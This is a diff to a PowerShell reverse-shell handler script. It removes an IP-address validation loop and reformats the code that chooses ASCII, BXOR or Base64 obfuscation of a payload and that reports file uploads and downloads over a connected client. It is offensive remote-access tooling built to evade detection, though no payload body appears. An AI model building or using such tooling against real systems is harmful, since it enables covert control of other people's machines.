@@ -1,4 +1,3 @@
-
 function Character_Obfuscation($String)
 {
   $String = $String.toCharArray();
@@ -146,13 +145,8 @@ $Modules = @"
 Clear-Host;
 Write-Host $Modules;
 
-$Pattern = "^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$";
-
-While(!("$Local_Host" -match $Pattern))
-{
-  Write-Host " - Local Host: " -NoNewline;
-  $Local_Host = Read-Host;
-}
+Write-Host " - Local Host: " -NoNewline;
+$Local_Host = Read-Host;
 
 While(!($Local_Port))
 {
@@ -199,19 +193,19 @@ Write-Host " - Local Port: $Local_Port";
 
 If($Choice -eq "1")
 {
-	Write-Host "`n [*] Obfuscation Type: ASCII [*]";
-	$Payload = ASCII_Obfuscation($Payload);
+  Write-Host "`n [*] Obfuscation Type: ASCII [*]";
+  $Payload = ASCII_Obfuscation($Payload);
 }
 
 If($Choice -eq "2")
 {
-	Write-Host "`n [*] Obfuscation Type: BXOR [*]";
+  Write-Host "`n [*] Obfuscation Type: BXOR [*]";
   $Payload = BXOR_Obfuscation($Payload);
 }
 
 If($Choice -eq "3")
 {
-	Write-Host "`n [*] Obfuscation Type: Base64 [*]";
+  Write-Host "`n [*] Obfuscation Type: Base64 [*]";
   $Payload = Base64_Obfuscation($Payload);
 }
 
@@ -456,10 +450,12 @@ While($Client.Connected)
             Write-Host " [*] File Saved: $File [*]`n";
 
           } Else {
+
             Write-Host " [*] Failed ! [*]";
             Write-Host " [*] File already Exists [*]`n";
           }
         }   Else {
+
             Write-Host " [*] Failed ! [*]";
             Write-Host " [*] File Missing [*]`n";
         }
@@ -471,18 +467,19 @@ While($Client.Connected)
       If($Upload)
       {
         If($OutPut -ne " ")
-      {
-        $OutPut = $OutPut -replace "`n","";
-        Write-Host " [*] Success ! [*]";
-        Write-Host " [*] File Uploaded: $OutPut`n";
+        {
+          $OutPut = $OutPut -replace "`n","";
+          Write-Host " [*] Success ! [*]";
+          Write-Host " [*] File Uploaded: $OutPut`n";
 
-      } Else {
-        Write-Host " [*] Failed ! [*]";
-        Write-Host " [*] File already Exists [*]`n";
+        } Else {
+          
+          Write-Host " [*] Failed ! [*]";
+          Write-Host " [*] File already Exists [*]`n";
+        }
+
+        $Upload = $False;
       }
-
-      $Upload = $False;
-    }
 
     $WaitData = $False;
     $Read = $Null;
